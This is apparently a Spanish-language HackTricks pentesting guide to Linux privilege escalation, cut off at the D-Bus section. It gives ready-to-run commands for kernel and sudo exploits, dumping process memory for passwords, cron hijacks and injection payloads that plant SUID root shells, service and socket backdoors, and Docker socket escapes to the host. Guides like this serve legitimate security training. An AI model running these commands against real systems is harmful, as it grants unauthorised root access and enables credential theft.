# Escalada de privilegios en Linux

{{#include ../../banners/hacktricks-training.md}}

## Información del sistema

### Info del SO

Empecemos a obtener información del SO en ejecución
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Ruta

Si **tienes permisos de escritura en cualquier carpeta dentro de la variable `PATH`**, es posible que puedas secuestrar algunas librerías o binarios:
```bash
echo $PATH
```
### Información del entorno

¿Información interesante, contraseñas o claves API en las variables de entorno?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Comprueba la versión del kernel y si hay algún exploit disponible que pueda utilizarse para escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Puedes encontrar una buena lista de kernels vulnerables y algunos ya **compiled exploits** aquí: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) y [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Otros sitios donde puedes encontrar algunos **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extraer todas las versiones de kernel vulnerables de ese sitio web puedes hacer:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Herramientas que pueden ayudar a buscar exploits del kernel son:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ejecutar EN victim, solo comprueba exploits para kernel 2.x)

Siempre **busca la versión del kernel en Google**, quizá tu versión del kernel esté escrita en algún exploit del kernel y así estarás seguro de que ese exploit es válido.

Additional kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo versión

Basado en las versiones vulnerables de sudo que aparecen en:
```bash
searchsploit sudo
```
Puedes comprobar si la versión de sudo es vulnerable usando este grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Las versiones de Sudo anteriores a 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permiten que usuarios locales sin privilegios escalen sus privilegios a root mediante la opción `--chroot` de sudo cuando el archivo `/etc/nsswitch.conf` se usa desde un directorio controlado por el usuario.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg verificación de firma fallida

Revisa **smasher2 box of HTB** para un **ejemplo** de cómo se podría explotar esta vuln
```bash
dmesg 2>/dev/null | grep "signature"
```
### Más system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerar posibles defensas

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Si estás dentro de un docker container puedes intentar escapar de él:


{{#ref}}
docker-security/
{{#endref}}

## Unidades

Revisa **qué está montado y desmontado**, dónde y por qué. Si algo está desmontado, podrías intentar montarlo y revisar si contiene información privada
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumerar binarios útiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Además, comprueba si **algún compilador está instalado**. Esto es útil si necesitas usar algún kernel exploit, ya que se recomienda compilarlo en la máquina donde lo vas a usar (o en otra similar)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software vulnerable instalado

Comprueba la **versión de los paquetes y servicios instalados**. Puede que exista alguna versión antigua de Nagios (por ejemplo) que pueda ser explotada para escalating privileges…\
Se recomienda comprobar manualmente la versión del software instalado que parezca más sospechoso.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si tienes acceso SSH a la máquina también podrías usar **openVAS** para comprobar si hay software instalado en la máquina que esté desactualizado o sea vulnerable.

> [!NOTE] > _Ten en cuenta que estos comandos mostrarán mucha información que en su mayoría será inútil; por lo tanto, se recomienda usar aplicaciones como OpenVAS u otras similares que comprueben si alguna versión de software instalada es vulnerable a exploits conocidos_

## Processes

Echa un vistazo a **qué procesos** se están ejecutando y comprueba si algún proceso tiene **más privilegios de los que debería** (¿quizá un tomcat ejecutándose como root?)
```bash
ps aux
ps -ef
top -n 1
```
Siempre comprueba si hay [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\  
También comprueba tus privilegios sobre los binaries de los procesos; quizá puedas sobrescribir alguno.

### Process monitoring

Puedes usar herramientas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorizar procesos. Esto puede ser muy útil para identificar procesos vulnerables que se ejecutan con frecuencia o cuando se cumplen un conjunto de condiciones.

### Process memory

Algunos servicios de un servidor guardan **credenciales en texto claro dentro de la memoria**.\
Normalmente necesitarás **privilegios de root** para leer la memoria de procesos que pertenecen a otros usuarios, por lo que esto suele ser más útil cuando ya eres root y quieres descubrir más credenciales.\
Sin embargo, recuerda que **como usuario normal puedes leer la memoria de los procesos que posees**.

> [!WARNING]
> Ten en cuenta que hoy en día la mayoría de las máquinas **no permiten ptrace por defecto**, lo que significa que no puedes dump otros procesos que pertenezcan a tu usuario sin privilegios.
>
> El archivo _**/proc/sys/kernel/yama/ptrace_scope**_ controla la accesibilidad de ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: todos los procesos pueden ser depurados, siempre que tengan el mismo uid. Esta es la forma clásica en la que ptracing funcionaba.
> - **kernel.yama.ptrace_scope = 1**: solo un proceso padre puede ser depurado.
> - **kernel.yama.ptrace_scope = 2**: Solo el admin puede usar ptrace, ya que requiere la capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Ningún proceso puede ser trazado con ptrace. Una vez establecido, se necesita un reinicio para habilitar ptrace de nuevo.

#### GDB

Si tienes acceso a la memoria de un servicio FTP (por ejemplo) podrías obtener el Heap y buscar en su interior credenciales.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Para un ID de proceso dado, **maps muestran cómo se mapea la memoria dentro del** espacio de direcciones virtual de ese proceso; también muestran los **permisos de cada región mapeada**. El **mem** pseudoarchivo **expone la memoria del proceso**. A partir del archivo **maps** sabemos qué **regiones de memoria son legibles** y sus offsets. Usamos esta información para **posicionarnos en el archivo mem y volcar todas las regiones legibles** en un archivo.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` proporciona acceso a la memoria **física** del sistema, no a la memoria virtual. Al espacio de direcciones virtual del kernel se puede acceder usando /dev/kmem.\
Normalmente, `/dev/mem` solo es legible por **root** y el grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump es una reinterpretación para Linux de la clásica herramienta ProcDump de la suite Sysinternals para Windows. Consíguelo en [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Herramientas

Para volcar la memoria de un proceso puedes usar:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puedes eliminar manualmente los requisitos de root y volcar el proceso que te pertenece
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (se requiere root)

### Credenciales de la memoria del proceso

#### Ejemplo manual

Si encuentras que el proceso authenticator está en ejecución:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Puedes volcar el proceso (consulta las secciones anteriores para encontrar diferentes maneras de volcar la memoria de un proceso) y buscar credenciales dentro de la memoria:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

La herramienta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **robará credenciales en texto claro de la memoria** y de algunos **archivos bien conocidos**. Requiere privilegios root para funcionar correctamente.

| Característica                                    | Nombre del proceso   |
| ------------------------------------------------- | -------------------- |
| Contraseña GDM (Kali Desktop, Debian Desktop)     | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Conexiones FTP activas)                   | vsftpd               |
| Apache2 (sesiones HTTP Basic Auth activas)        | apache2              |
| OpenSSH (sesiones SSH activas - uso de sudo)      | sshd:                |

#### Expresiones Regulares de Búsqueda/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tareas programadas/Cron jobs

### Crontab UI (alseambusher) ejecutándose como root – web-based scheduler privesc

Si un panel web “Crontab UI” (alseambusher/crontab-ui) se ejecuta como root y sólo está ligado a loopback, aún puedes acceder a él mediante SSH local port-forwarding y crear una tarea privilegiada para escalar.

Typical chain
- Descubrir puerto solo en loopback (p.ej., 127.0.0.1:8000) y Basic-Auth realm vía `ss -ntlp` / `curl -v localhost:8000`
- Encontrar credenciales en artefactos operativos:
- Backups/scripts con `zip -P <password>`
- Unidad systemd exponiendo `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crear un job con privilegios elevados y ejecutarlo inmediatamente (genera un shell SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Úsalo:
```bash
/tmp/rootshell -p   # root shell
```
Endurecimiento
- No ejecutar Crontab UI como root; restringir a un usuario dedicado con permisos mínimos
- Vincular a localhost y, además, restringir el acceso vía firewall/VPN; no reutilizar contraseñas
- Evitar incrustar secretos en unit files; usar almacenes de secretos o un EnvironmentFile accesible solo por root
- Habilitar audit/logging para ejecuciones de jobs bajo demanda

Comprueba si alguna tarea programada es vulnerable. Quizá puedas aprovechar un script que se ejecuta como root (¿vulnerabilidad con comodines? ¿puedes modificar archivos que usa root? ¿usar symlinks? ¿crear archivos específicos en el directorio que usa root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Por ejemplo, dentro de _/etc/crontab_ puedes encontrar el PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Nota cómo el usuario "user" tiene permisos de escritura sobre /home/user_)

Si dentro de este crontab el usuario root intenta ejecutar algún comando o script sin establecer el path. Por ejemplo: _\* \* \* \* root overwrite.sh_\
Entonces, puedes obtener una shell como root usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Si un script es ejecutado por root y tiene un “**\***” dentro de un comando, podrías explotarlo para provocar cosas inesperadas (como privesc). Ejemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si el wildcard está precedido por una ruta como** _**/some/path/\***_ **, no es vulnerable (incluso** _**./\***_ **no lo es).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash realiza parameter expansion y command substitution antes de la evaluación aritmética en ((...)), $((...)) y let. Si un cron/parser ejecutado como root lee campos de log no confiables y los introduce en un arithmetic context, un atacante puede inyectar un command substitution $(...) que se ejecuta como root cuando corre el cron.

- Por qué funciona: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. Así que un valor como `$(/bin/bash -c 'id > /tmp/pwn')0` se sustituye primero (ejecutando el comando), luego el `0` numérico restante se usa para la aritmética y el script continúa sin errores.

- Patrón típico vulnerable:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Explotación: Consigue que se escriba texto attacker-controlled en el log que se parsea de modo que el campo con apariencia numérica contenga un command substitution y termine con un dígito. Asegúrate de que tu comando no imprima en stdout (o redirígelo) para que la operación aritmética siga siendo válida.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si el script ejecutado por root utiliza un **directorio al que tienes acceso completo**, quizá sea útil borrar esa carpeta y **crear un symlink hacia otra** que apunte a un script controlado por ti
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Binarios de cron firmados a medida con payloads escribibles
Los blue teams a veces "firman" binarios impulsados por cron volcando una sección ELF personalizada y haciendo grep de una cadena del proveedor antes de ejecutarlos como root. Si ese binario es escribible por el grupo (p. ej., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) y puedes leak el material de firma, puedes falsificar la sección y secuestrar la tarea cron:

1. Usa `pspy` para capturar el flujo de verificación. En Era, root ejecutó `objcopy --dump-section .text_sig=text_sig_section.bin monitor` seguido de `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` y luego ejecutó el archivo.
2. Recrea el certificado esperado usando la leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Crea un reemplazo malicioso (p. ej., drop a SUID bash, add your SSH key) e inserta el certificado en `.text_sig` para que el grep pase:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Sobrescribe el binario programado conservando los bits de ejecución:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Espera a la siguiente ejecución de cron; una vez que la comprobación de firma ingenua tenga éxito, tu payload se ejecutará como root.

### Tareas cron frecuentes

Puedes monitorizar los procesos para buscar procesos que se estén ejecutando cada 1, 2 o 5 minutos. Quizá puedas aprovecharlo para escalar privilegios.

Por ejemplo, para **monitorizar cada 0.1s durante 1 minuto**, **ordenar por los comandos menos ejecutados** y eliminar los comandos que se han ejecutado más, puedes hacer:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**También puedes usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (esto monitorizará y listará cada proceso que se inicie).

### Cron jobs invisibles

Es posible crear un cronjob **colocando un retorno de carro después de un comentario** (sin carácter de nueva línea), y el cron job funcionará. Ejemplo (nota el carácter de retorno de carro):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Archivos _.service_ escribibles

Comprueba si puedes escribir cualquier archivo `.service`, si puedes, **podrías modificarlo** para que **ejecute** tu **backdoor cuando** el servicio se **inicie**, se **reinicie** o se **detenga** (quizá necesites esperar hasta que la máquina se reinicie).\
Por ejemplo, crea tu backdoor dentro del archivo .service con **`ExecStart=/tmp/script.sh`**

### Binarios de servicio escribibles

Ten en cuenta que si tienes **permisos de escritura sobre binarios que son ejecutados por servicios**, puedes modificarlos por backdoors de modo que, cuando los servicios se vuelvan a ejecutar, se ejecuten los backdoors.

### systemd PATH - Rutas relativas

Puedes ver el PATH usado por **systemd** con:
```bash
systemctl show-environment
```
Si descubres que puedes **write** en cualquiera de las carpetas de la ruta, puede que seas capaz de **escalate privileges**. Necesitas buscar **relative paths being used on service configurations** files como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Luego, crea un **executable** con el **mismo nombre que el binary de la ruta relativa** dentro de la carpeta PATH de systemd que puedas escribir, y cuando el servicio sea solicitado para ejecutar la acción vulnerable (**Start**, **Stop**, **Reload**), tu **backdoor será ejecutado** (los usuarios sin privilegios normalmente no pueden start/stop services pero comprueba si puedes usar `sudo -l`).

**Aprende más sobre services con `man systemd.service`.**

## **Timers**

**Timers** son archivos de unidad de systemd cuyo nombre termina en `**.timer**` que controlan archivos o eventos `**.service**`. Los **Timers** pueden usarse como alternativa a cron, ya que tienen soporte incorporado para eventos de tiempo de calendario y eventos de tiempo monotónico, y pueden ejecutarse de forma asincrónica.

Puedes enumerar todos los timers con:
```bash
systemctl list-timers --all
```
### Temporizadores escribibles

Si puedes modificar un temporizador, puedes hacer que ejecute algunas unidades de systemd.unit (como un `.service` o un `.target`)
```bash
Unit=backdoor.service
```
En la documentación puedes leer qué es la unidad:

> La unidad que se activa cuando este timer expira. El argumento es un nombre de unidad, cuyo sufijo no es ".timer". Si no se especifica, este valor por defecto apunta a un service que tiene el mismo nombre que la unidad timer, excepto por el sufijo. (See above.) Se recomienda que el nombre de la unidad que se activa y el nombre de la unidad del timer se llamen idénticamente, salvo por el sufijo.

Therefore, to abuse this permission you would need to:

- Encuentra alguna unidad systemd (como una `.service`) que esté **ejecutando un binario escribible**
- Encuentra alguna unidad systemd que esté **ejecutando una ruta relativa** y tengas **privilegios de escritura** sobre el **systemd PATH** (para suplantar ese ejecutable)

**Learn more about timers with `man systemd.timer`.**

### **Habilitar Timer**

Para habilitar un timer necesitas privilegios de root y ejecutar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Estas opciones son distintas pero, en resumen, se usan para **indicar dónde va a escuchar** el socket (la ruta del archivo de socket AF_UNIX, el/los número(s) IPv4/6 y/o el puerto a escuchar, etc.)
- `Accept`: Toma un argumento booleano. Si **true**, se **genera una instancia del service por cada conexión entrante** y solo se le pasa el socket de conexión. Si **false**, todos los sockets de escucha se **pasan a la unidad de service iniciada**, y sólo se crea una unidad de service para todas las conexiones. Este valor se ignora para datagram sockets y FIFOs, donde una única unidad de service maneja incondicionalmente todo el tráfico entrante. **Por defecto es false**. Por razones de rendimiento, se recomienda escribir nuevos daemons únicamente de una forma adecuada para `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Aceptan una o más líneas de comando, las cuales se **ejecutan antes** o **después** de que los sockets/FIFOs de escucha sean **creados** y enlazados, respectivamente. El primer token de la línea de comando debe ser un nombre de archivo absoluto, seguido de los argumentos para el proceso.
- `ExecStopPre`, `ExecStopPost`: Comandos adicionales que se **ejecutan antes** o **después** de que los sockets/FIFOs de escucha sean **cerrados** y removidos, respectivamente.
- `Service`: Especifica el nombre de la unidad **service** que se **activará** con tráfico entrante. Esta opción solo está permitida para sockets con Accept=no. Por defecto apunta al service que lleva el mismo nombre que el socket (con el sufijo reemplazado). En la mayoría de los casos no debería ser necesario usar esta opción.

### Writable .socket files

Si encuentras un archivo `.socket` **writable**, puedes **añadir** al inicio de la sección `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` y el backdoor se ejecutará antes de que se cree el socket. Por lo tanto, **probablemente necesitarás esperar hasta que la máquina se reinicie.**\
 _Nota que el sistema debe estar usando esa configuración de archivo socket o el backdoor no se ejecutará_

### Writable sockets

Si **identificas algún socket writable** (_ahora estamos hablando de Unix Sockets y no de los archivos de configuración `.socket`_), entonces **puedes comunicarte** con ese socket y quizá explotar una vulnerabilidad.

### Enumerar Unix Sockets
```bash
netstat -a -p --unix
```
### Conexión sin procesar
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Ejemplo de explotación:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Ten en cuenta que puede haber algunos **sockets listening for HTTP** requests (_no me refiero a archivos .socket sino a los archivos que actúan como unix sockets_). Puedes comprobar esto con:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Si el socket **responde con una petición HTTP**, entonces puedes **comunicarte** con él y quizá **exploit some vulnerability**.

### Socket de Docker escribible

El socket de Docker, a menudo ubicado en `/var/run/docker.sock`, es un archivo crítico que debe estar asegurado. Por defecto, es escribible por el usuario `root` y los miembros del grupo `docker`. Poseer acceso de escritura a este socket puede conducir a privilege escalation. A continuación se muestra un desglose de cómo puede hacerse esto y métodos alternativos si el Docker CLI no está disponible.

#### **Privilege Escalation with Docker CLI**

Si tienes acceso de escritura al socket de Docker, puedes escalate privileges usando los siguientes comandos:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Estos comandos te permiten ejecutar un container con acceso root al sistema de ficheros del host.

#### **Uso directo de Docker API**

En casos en los que el Docker CLI no está disponible, el Docker socket todavía puede manipularse usando la Docker API y comandos `curl`.

1.  **List Docker Images:** Recupera la lista de imágenes disponibles.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Envía una petición para crear un container que monte el directorio raíz del sistema host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Inicia el container recién creado:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Usa `socat` para establecer una conexión con el container, permitiendo la ejecución de comandos dentro de él.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Tras establecer la conexión con `socat`, puedes ejecutar comandos directamente en el container con acceso root al sistema de ficheros del host.

### Others

Ten en cuenta que si tienes permisos de escritura sobre el docker socket porque estás **dentro del grupo `docker`** tienes [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Si la [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consulta **más maneras de escapar de docker o abusarlo para escalar privilegios** en:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Si descubres que puedes usar el comando **`ctr`** lee la siguiente página ya que **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Si descubres que puedes usar el comando **`runc`** lee la siguiente página ya que **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus es un sofisticado sistema de comunicación entre procesos (IPC) que permite a las aplicaciones interactuar y compartir datos de forma eficiente. Diseñado teniendo en cuenta el sistema Linux moderno, ofrece un marco robusto para diferentes formas de comunicación entre aplicaciones.

El sistema es versátil, soportando IPC básico que mejora el intercambio de datos entre procesos, reminiscente de sockets de dominio UNIX mejorados. Además, facilita la emisión de eventos o señales, fomentando la integración fluida entre componentes del sistema. Por ejemplo, una señal de un daemon Bluetooth sobre una llamada entrante puede indicar a un reproductor de música que silencie el audio, mejorando la experiencia del usuario. Adicionalmente, D-Bus soporta un sistema de objetos remotos que simplifica las peticiones de servicio y las invocaciones de métodos entre aplicaciones, racionalizando procesos que tradicionalmente eran complejos.

